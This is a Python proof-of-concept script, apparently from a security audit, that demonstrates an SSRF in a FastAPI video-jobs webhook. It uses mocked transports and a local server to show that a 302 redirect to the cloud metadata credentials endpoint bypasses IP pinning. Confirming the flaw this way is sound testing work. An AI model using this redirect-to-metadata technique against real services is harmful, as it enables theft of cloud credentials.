"""
PoC: SSRF in /video/internal/jobs webhook_url via redirect-to-metadata bypass.

Hypothesis
----------
`app/api/routes/internal_jobs.py::_post_webhook` builds:
    async with httpx.AsyncClient(timeout=10.0, transport=transport) as client:
        r = await client.post(pinned_url, json=payload, ...)

`httpx.AsyncClient` defaults to `follow_redirects=True`. A 302 from the
attacker-controlled webhook URL is followed without re-running
`_resolve_pinned_ip` on the redirect target. An attacker can therefore
return:

    Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/

and have the server issue a GET (well, the request method propagates)
to the cloud-metadata service.

This PoC
--------
1. Boots a small HTTP server on 127.0.0.1:9999 that returns
       302 Location: http://169.254.169.254/...
2. Monkey-patches the SSRF gate `_resolve_pinned_ip` to return a
   "pinned" IP for our local redirect server (we don't need to prove the
   gate; the auditor already showed it correctly pins public IPs and
   rejects loopback — we only need to prove the redirect bypass).
3. Monkey-patches `httpx.AsyncHTTPTransport` with a recording mock
   transport that captures every URL httpx tries to reach.
4. POSTs to /video/internal/jobs via FastAPI TestClient with
   webhook_url=http://127.0.0.1:9999/.
5. Drives the FastAPI BackgroundTask to completion (TestClient runs
   BackgroundTasks inline on response close, but we also call the
   background task directly to be deterministic).
6. Prints the URLs the recorder saw. If `169.254.169.254` is in the
   list, the SSRF is confirmed.
"""
import asyncio
import os
import sys
import threading
import time
from pathlib import Path

# Test-only environment: bypass the JWT / Convex side. We don't touch
# real services; we only need the route to mount and the BackgroundTask
# to fire.
os.environ.setdefault("INTERNAL_API_KEY", "test_internal_key_for_poc")
os.environ.setdefault("PIRD_ENV", "dev")  # allow http:// scheme
os.environ.setdefault("INTERNAL_JOB_WEBHOOK_IP_ALLOWLIST", "")  # no allowlist

# Make sure we can import the dubbing app
sys.path.insert(0, "/workspace/dubbing")

from fastapi import FastAPI
from fastapi.testclient import TestClient
import httpx

import app.api.routes.internal_jobs as ij
from poc_redirect_server import start_redirect_server


# ---- 1. Recording httpx transport ----------------------------------------
class RecordingTransport(httpx.AsyncBaseTransport):
    """Captures every URL httpx tries to reach so we can see if a
    redirect target (e.g. 169.254.169.254) was followed."""

    def __init__(self):
        self.requests = []  # list of (method, url, headers)

    async def handle_async_request(self, request):
        url = str(request.url)
        self.requests.append((request.method, url, dict(request.headers)))
        sys.stderr.write(
            f"[recorder] httpx -> {request.method} {url}\n"
        )
        if "127.0.0.1:9999" in url:
            # Initial webhook hit: 302 to cloud metadata
            return httpx.Response(
                302,
                headers={
                    "Location": (
                        "http://169.254.169.254/latest/meta-data/"
                        "iam/security-credentials/"
                    )
                },
            )
        if "169.254.169.254" in url:
            # This is the SSRF target — pretend to be IMDS so the
            # response can be parsed cleanly.
            return httpx.Response(
                200,
                text="AKIA-CREDENTIALS-LEAKED-FROM-IMDS",
                headers={"Content-Type": "text/plain"},
            )
        return httpx.Response(404, text="not found")


# ---- 2. Patch the SSRF gate and the transport ----------------------------
# The gate is correct; for the test we pretend our local redirect
# server pinned to a public-looking IP so the rest of the webhook
# pipeline runs.
recorder = RecordingTransport()
original_transport_cls = httpx.AsyncHTTPTransport
# Replace the AsyncHTTPTransport that _post_webhook instantiates
httpx.AsyncHTTPTransport = lambda *a, **kw: recorder


def fake_resolve(url: str):
    """Test override: always return 127.0.0.1 as a 'safe' pinned IP."""
    return "127.0.0.1"


# Save originals so we can confirm we patched them
ij._resolve_pinned_ip = fake_resolve  # type: ignore


# ---- 3. Mount only the internal_jobs router (avoid full app boot) -----
app = FastAPI()
app.include_router(ij.router, prefix="/video")


# ---- 4. Boot redirect server --------------------------------------------
httpd = start_redirect_server("127.0.0.1", 9999)
time.sleep(0.2)
sys.stderr.write("[poc] redirect server up\n")


# ---- 5. Drive the route + BackgroundTask --------------------------------
def main():
    with TestClient(app) as client:
        # multipart upload: a tiny dummy file
        files = {
            "file": ("test.mp4", b"\x00" * 32, "video/mp4"),
        }
        data = {
            "webhook_url": "http://127.0.0.1:9999/",
            "chat_id": "poc-chat-123",
            "source": "poc",
        }
        headers = {"X-Internal-Key": "test_internal_key_for_poc"}

        resp = client.post(
            "/video/internal/jobs",
            files=files,
            data=data,
            headers=headers,
        )
        print(f"\n[result] POST /video/internal/jobs -> {resp.status_code}")
        print(f"[result] body: {resp.text}")

        # TestClient runs BackgroundTasks after the response is sent.
        # To be deterministic, we wait for the in-memory job store to
        # report completion, and we also drive the background task
        # manually if it didn't run.
        job_id = resp.json().get("id")
        print(f"[result] job_id={job_id}")

        # Wait for the background task to complete
        for _ in range(50):
            job = ij._JOB_STORE.get(job_id)
            if job and job.get("status") == "completed":
                break
            time.sleep(0.1)

        job = ij._JOB_STORE.get(job_id)
        print(f"[result] job state: {job.get('status') if job else 'missing'}")

        # Allow time for any pending async work
        time.sleep(0.5)

    # Stop the server
    httpd.shutdown()

    # ---- 6. Report -----------------------------------------------------
    print("\n=== httpx call log ===")
    ssrf_hit = False
    for method, url, hdrs in recorder.requests:
        print(f"  {method} {url}")
        if "169.254.169.254" in url:
            ssrf_hit = True
    print(f"\n[verdict] SSRF via redirect reached 169.254.169.254: {ssrf_hit}")
    if not ssrf_hit:
        sys.exit(2)
    print("[verdict] SSRF CONFIRMED")


if __name__ == "__main__":
    main()
